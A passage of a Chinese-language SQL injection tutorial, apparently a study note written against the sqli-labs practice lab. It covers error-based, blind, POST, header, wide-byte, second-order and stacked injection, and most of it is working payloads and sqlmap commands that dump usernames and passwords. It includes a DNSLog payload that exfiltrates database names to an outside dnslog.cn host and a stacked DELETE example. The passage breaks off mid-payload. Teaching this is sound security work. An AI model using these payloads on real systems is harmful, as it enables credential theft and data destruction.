src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129154040322.png" alt="image-20201129154040322"></p><p><strong>3.查询字段</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D security -T users --columns --batch</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129154015859.png" alt="image-20201129154015859"></p><p><strong>4.查询数据</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D security -T users -C id,password,username --dump</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129154914063.png" alt="image-20201129154914063"></p><p><strong>Sqlmap检测过程中的payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id&#x3D;1&#39; AND 6535&#x3D;6535 AND &#39;MMEg&#39;&#x3D;&#39;MMEg</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</span><br><span class="line">    Payload: id&#x3D;1&#39; AND EXTRACTVALUE(6529,CONCAT(0x5c,0x7162717a71,(SELECT (ELT(6529&#x3D;6529,1))),0x7176767a71)) AND &#39;SxoL&#39;&#x3D;&#39;SxoL</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id&#x3D;1&#39; AND (SELECT 9353 FROM (SELECT(SLEEP(5)))yGeE) AND &#39;aMBL&#39;&#x3D;&#39;aMBL</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: id&#x3D;-3115&#39; UNION ALL SELECT NULL,CONCAT(0x7162717a71,0x7372786d534b54684f795a787a4e736962676675516963714d7759496751777a4b41614f57426376,0x7176767a71),NULL-- -</span><br></pre></td></tr></table></figure><h1 id="GET-报错注入"><a href="#GET-报错注入" class="headerlink" title="GET 报错注入"></a>GET 报错注入</h1><p>在没有数据回显的时候，通过报错来显示具体的信息</p><p>1.<strong>floor()函数</strong></p><p>原理：<a href="https://blog.csdn.net/shuteer_xu/article/details/104438405">Mysql报错注入之函数分析</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">注入公式（Payload为自己想获取内容的脚本）：</span><br><span class="line">and(select 1 from (select count(*),concat(concat(payload),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br><span class="line">and(select 1 from (select count(*),concat(concat(database(),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br><span class="line">&#x2F;&#x2F;暴库</span><br><span class="line">and(select 1 from (select count(*),concat(concat((select concat(table_name) from information_schema.tables where table_schema&#x3D;&quot;security&quot; limit 3,1),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br><span class="line">&#x2F;&#x2F;查询表</span><br><span class="line">and(select 1 from (select count(*),concat(concat((select concat(column_name) from information_schema.columns where table_schema&#x3D;&quot;security&quot; and table_name&#x3D;&quot;users&quot; limit 1,1),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br><span class="line">&#x2F;&#x2F;查询字段</span><br><span class="line">and(select 1 from (select count(*),concat(concat((select concat(username,0x7e,password,0x7e) from security.users limit 1,1),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br><span class="line">&#x2F;&#x2F;查询字段内容</span><br></pre></td></tr></table></figure><p>2.<strong>extractvalue()函数</strong></p><p>extractvalue(目标xml文档，xml路径) :对XML文档进行查询的函数</p><p>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p><p>注意：extractvalue()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring()函数截取，一次查看32位</p><p>extractvalue() 函数不支持低版本 mysql</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(0x7e,(payload),0x7e))</span><br></pre></td></tr></table></figure><p><strong>3.updatexml()函数</strong></p><p>updatexml(目标xml文档，xml路径，更新的内容)：对xml文档进行更新的函数</p><p>updatexml和上面的extractvlaue函数基本上相差不大，用法也相同</p><p>注：高版本的mysql已经修复了该bug</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x7e,(payload),0x7e),1)</span><br></pre></td></tr></table></figure><h1 id="GET-布尔盲注"><a href="#GET-布尔盲注" class="headerlink" title="GET 布尔盲注"></a>GET 布尔盲注</h1><p>在没有报错信息时，根据页面回显情况不同考虑布尔盲注</p><h2 id="手动测试-1"><a href="#手动测试-1" class="headerlink" title="手动测试"></a>手动测试</h2><p><strong>1.检测是否存在注入点</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1     #页面正常显示</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130203312421.png" alt="image-20201130203312421"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1&#39;    #无报错信息，但不返回&quot;You are in......&quot;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130203507136.png" alt="image-20201130203507136"></p><p><strong>2.判断当前数据库的长度</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and length(database()) &gt; 5--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130204339111.png" alt="image-20201130204339111"></p><p><strong>length(str)</strong>      返回字符串长度</p><p>页面显示正常，说明库名长度大于5</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and length(database()) &gt; 10--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130204918453.png" alt="image-20201130204918453"></p><p>继续判断库名长度，此页面表示其小于10</p><p>缩小范围判断，得出当前库名长度为8</p><p><strong>3.判断当前数据库的第一个字符</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr(database(),1,1)) &#x3D; 115--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130205353557.png" alt="image-20201130205353557"></p><p><strong>ASCII(s)</strong>      返回字符串 s 的第一个字符的 ASCII 码</p><p><strong>SUBSTR(s, n, len)</strong>      从字符串 s 的 n 位置截取长度为 len 的子字符串</p><p>页面显示正常，说明当前数据库的第一个字符的ascii码是115，对应s</p><p>…….更改位置，逐步得出库名security</p><p>……以此类推，得出其他数据</p><h2 id="利用burpsuite测试"><a href="#利用burpsuite测试" class="headerlink" title="利用burpsuite测试"></a><strong>利用burpsuite测试</strong></h2><p>对上面第三步进行抓包，使用intruder模块</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201209162311335.png" alt="image-20201209162311335"></p><p>设置payloads</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201209162508699.png" alt="image-20201209162508699"></p><p>start attack</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201209163040562.png" alt="image-20201209163040562"></p><h1 id="GET-时间盲注"><a href="#GET-时间盲注" class="headerlink" title="GET 时间盲注"></a>GET 时间盲注</h1><p>当页面回显内容完全一致，考虑时间盲注</p><h2 id="手动测试-2"><a href="#手动测试-2" class="headerlink" title="手动测试"></a>手动测试</h2><p><strong>1.检测是否存在注入点</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(1&#x3D;0,1,sleep(10))--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129174459638.png" alt="image-20201129174459638"></p><p><strong>if（expression,a,b）</strong>  expression条件为真返回a,条件为假返回b</p><p>F12查看network信息，可以看到延迟了10秒，证明存在注入点</p><p><strong>2.判断当前数据库的长度</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(length(database())&#x3D;8,sleep(10),1)--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129175046395.png" alt="image-20201129175046395"></p><p>延迟10秒，说明判断成功，当前数据库长度为8</p><p><strong>3.判断当前数据库的第一个字符</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;115,sleep(10),1)--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129175759624.png" alt="image-20201129175759624"></p><p>延迟10秒，说明当前数据库的第一个字符的ascii码是115，对应s</p><p>…….更改位置，逐步得出库名security</p><p>……以此类推，得出其他数据</p><h2 id="Sqlmap下测试"><a href="#Sqlmap下测试" class="headerlink" title="Sqlmap下测试"></a><strong>Sqlmap下测试</strong></h2><p>查询库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1&quot; --technique B --dbs --batch   #布尔型盲注</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-9&#x2F;?id&#x3D;1&quot; --technique T --dbs --batch   #时间盲注</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id&#x3D;1&#39; AND 1071&#x3D;1071 AND &#39;MFtC&#39;&#x3D;&#39;MFtC</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id&#x3D;1&#39; AND (SELECT 5530 FROM (SELECT(SLEEP(5)))VtGF) AND &#39;VpPN&#39;&#x3D;&#39;VpPN</span><br></pre></td></tr></table></figure><p>后续步骤与上述Sqlmap测试方法一致</p><p>……</p><h1 id="POST-报错注入"><a href="#POST-报错注入" class="headerlink" title="POST 报错注入"></a>POST 报错注入</h1><h2 id="手动测试-3"><a href="#手动测试-3" class="headerlink" title="手动测试"></a>手动测试</h2><p><strong>通过SQL的or运算符，构造万能密码，判断是否为注入点</strong></p><p>判断注入点（添加单引号后报错）</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203161208957.png" alt="image-20201203161208957"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39; or 1&#x3D;1--+&amp;passwd&#x3D;123456 构造万能密码</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201202230449498.png" alt="image-20201202230449498"></p><p>判断出注入点之后，就可以利用报错注入,布尔盲注，时间盲注等，获得我们想要的相关信息</p><p>如利用报错注入获取当前数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39; or extractvalue(1,concat(0x7e,(database()),0x7e))--+&amp;passwd&#x3D;123456</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201202230243117.png" alt="image-20201202230243117"></p><p>……</p><h2 id="利用burp-suite测试"><a href="#利用burp-suite测试" class="headerlink" title="利用burp suite测试"></a><strong>利用burp suite测试</strong></h2><p><strong>使用Proxy功能抓包</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201202230900185.png" alt="image-20201202230900185"></p><p><strong>使用Repeater功能</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201202231127632.png" alt="image-20201202231127632"></p><p><strong>构造万能密码</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201202231557574.png" alt="image-20201202231557574"></p><h2 id="利用Sqlmap测试-1"><a href="#利用Sqlmap测试-1" class="headerlink" title="利用Sqlmap测试"></a>利用Sqlmap测试</h2><p>复制Burpsuite截断的HTTP请求数据包到文本文件中，使用<strong>Sqlmap -r 文件路径 -p 指定探测参数</strong></p><p>这里复制数据包至sqlmap目录下的target.txt文件</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203000201440.png" alt="image-20201203000201440"></p><p>在Sqlmap中指定探测技术使用–technique  BEUSTQ</p><p><strong>–technique E</strong> 基于报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r target.txt -p passwd --technique E</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203000800804.png" alt="image-20201203000800804"></p><p><strong>payload：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Parameter: passwd (POST)</span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: uname&#x3D;admin&amp;passwd&#x3D;123456&#39; AND GTID_SUBSET(CONCAT(0x716a766b71,(SELECT (ELT(7356&#x3D;7356,1))),0x7176706a71),7356)-- lpbw&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p>其后添加参数以获取其他信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r target.txt -p passwd --technique E --dbs</span><br><span class="line">python sqlmap.py -r target.txt -p passwd --technique E --current-db --current-user --banner</span><br><span class="line">python sqlmap.py -r target.txt -p passwd --technique E -D security --tables</span><br><span class="line">python sqlmap.py -r target.txt -p passwd --technique E -D security -T users --columns</span><br><span class="line">python sqlmap.py -r target.txt -p passwd --technique E -D security -T users -C password,username --dump</span><br></pre></td></tr></table></figure><h1 id="POST-布尔、时间盲注"><a href="#POST-布尔、时间盲注" class="headerlink" title="POST 布尔、时间盲注"></a>POST 布尔、时间盲注</h1><p>在admin后添加单引号等字符后并无报错信息，考虑盲注</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203162418352.png" alt="image-20201203162418352"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;&#39;or (payload)--+&amp;passwd&#x3D;</span><br><span class="line">uname&#x3D;&#39;&#x3D;(payload)&#x3D;&#39; &#39;--+&amp;passwd&#x3D;</span><br><span class="line">&#x2F;&#x2F;如 uname&#x3D;&#39;or (length(database())&#x3D;8)--+&amp;passwd&#x3D;</span><br><span class="line">uname&#x3D;&#39;&#x3D;(ascii(substr(database(),1,1))&#x3D;115)&#x3D;&#39; &#39;--+&amp;passwd&#x3D;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201210213730100.png" alt="image-20201210213730100"></p><p><strong>利用burpsuite抓取数据包</strong>，在存在注入点POST提交的参数后加入判断语句，根据Response的结果获取信息</p><p>如下图，判断当前数据库长度是否大于5</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203164042900.png" alt="image-20201203164042900"></p><p>再判断其长度是否大于10</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203164228389.png" alt="image-20201203164228389"></p><p>最后判断其长度为8，以此类推，判断其他信息……</p><p>同样，也可以进行基于时间的盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;&#39;or (if(ascii(substr(database(),1,1))&#x3D;115,sleep(5),1))--+&amp;passwd&#x3D;</span><br></pre></td></tr></table></figure><p>在存在注入点POST提交的参数后添加判断语句，根据响应时间获取信息</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203170636591.png" alt="image-20201203170636591"></p><p>继续判断</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203170851871.png" alt="image-20201203170851871"></p><p>最后判断其长度为8，以此类推，判断其他信息……</p><p><strong>利用Sqlmap测试</strong></p><p>同样，这里复制数据包至target.txt,探测技术为–technique B/T</p><h1 id="DNSLog注入"><a href="#DNSLog注入" class="headerlink" title="DNSLog注入"></a>DNSLog注入</h1><p>利用场景：</p><p>不管是布尔类型盲注还是时间盲注，都需要发送大量的数据包去判断数据，而这很可能会触发WAF的防护，因此导致被封IP。所以，如果条件允许，我们可以结合DNSlog来快速的回显数据。MySQL数据库，通过DNSlog盲注需要用到 load_file() 函数，该函数不仅能加载本地文件，同时也能对URL发起请求。因为需要使用 load_file() 函数，所以需要root权限，并且 secure_file_priv 需要为空。</p><p>原理：</p><p>我们输入域名之后 ，需要向DNS服务器查询对应的IP地址，DNS服务器在解析的时候会留下记录，产生日志，我们可以通过查看日志来获取相应信息</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201213182240957.png" alt="image-20201213182240957"></p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 查询当前用户名</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and (select load_file(concat(&#39;\\\\&#39;,(select hex(user())),&#39;.5srmkc.dnslog.cn&#x2F;abc&#39;))) --+</span><br><span class="line"></span><br><span class="line"># 查看当前数据库名</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and (select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.5srmkc.dnslog.cn&#x2F;abc&#39;))) --+</span><br></pre></td></tr></table></figure><p>相关网站：<a href="http://www.dnslog.cn/">www.dnslog.cn</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201213183240282.png" alt="image-20201213183240282"></p><p>相关网站：<a href="https://www.bejson.com/convert/ox2str/">https://www.bejson.com/convert/ox2str/</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201213192730846.png" alt="image-20201213192730846"></p><h1 id="HTTP头中的SQL注入"><a href="#HTTP头中的SQL注入" class="headerlink" title="HTTP头中的SQL注入"></a>HTTP头中的SQL注入</h1><p>用户提交的参数会被代码中的某些措施进行过滤，但对于HTTP头中提交的内容很有可能就没有进行过滤，如HTTP头中User-Agent、Referer、Cookies等。</p><p><strong>1.HTTP User-Agent 注入</strong></p><p>判断注入点</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201206223156670.png" alt="image-20201206223156670"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; and extractvalue(1,concat(0x7e,(payload),0x7e)) or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201206222552051.png" alt="image-20201206222552051"></p><p><strong>2.HTTP Referer 注入</strong></p><p>注入点在Referer位置</p><p><strong>3.Cookie注入</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname&#x3D;admin&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201207155137874.png" alt="image-20201207155137874"></p><p><strong>Sqlmap测试</strong></p><p>在注入点位置处添加*</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201207160206033.png" alt="image-20201207160206033"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r target.txt --level 3 --batch</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Parameter: Cookie #1* ((custom) HEADER)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: uname&#x3D;admin&#39; AND 6901&#x3D;6901-- FpnT</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: uname&#x3D;admin&#39; AND GTID_SUBSET(CONCAT(0x71627a7071,(SELECT (ELT(9508&#x3D;9508,1))),0x71766a7871),9508)-- kWcz</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: uname&#x3D;admin&#39; AND (SELECT 6663 FROM (SELECT(SLEEP(5)))sHMZ)-- iCIs</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 4 columns</span><br><span class="line">    Payload: uname&#x3D;-8722&#39; UNION ALL SELECT NULL,NULL,CONCAT(0x71627a7071,0x4f414141466c504c686648564856454869665a68614a4b564d6c4775556f6d6d79464e446f6f7078,0x71766a7871)-- -</span><br></pre></td></tr></table></figure><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>原理：</p><p>大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 <code>%df\’</code> =<code>%df%5c%27</code>，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 <code>%df%5c</code> 是一个宽字符，也就是<code>縗</code>，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201213151446003.png" alt="image-20201213151446003"></p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-33&#x2F;index.php?id&#x3D;%df&#39; union select 1,group_concat(username,0x7e,password),3 from users--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201210204415465.png" alt="image-20201210204415465"></p><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p>原理：</p><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p><p>示例：</p><p>在sqlilabs，Less-24中注册用户名为admin’#密码为123的账号</p><p>登录用户名 admi’# 并修改密码为123456，结果是用户名为admin的密码被修改了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$curr_pass&#39; &quot;;</span><br><span class="line">这是上面的数据库更新语句，在用户名为 &quot;admin&#39;#&quot; 时执行的实际是：</span><br><span class="line">$sql &#x3D; &quot;UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;admin&#39;#&#39; and password&#x3D;&#39;$curr_pass&#39; &quot;;</span><br></pre></td></tr></table></figure><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>原理：</p><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除</p><p>局限性：</p><p>堆叠注入的局限性在于并不是每一个环境下都可以执行， 可能受到 API 或者数据库引擎不支持的限制，在我们的 web 系统中， 因为代码通常只返回一个查询结果， 因此， 堆叠注入第二个语句产生错误或者结果只能被忽略， 我们在前端界面是无法看到返回结果的。因此， 在读取数据时，建议使用union（联合） 注入。 同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的， 例如表<br>名， 列名等信息</p><p>PS：oracle 不能使用堆叠注入， 当有两条语句在同一行时， 直接报错。 无效字符</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-38&#x2F;index.php ?id&#x3D;1%27;insert into users(id,username,password) values 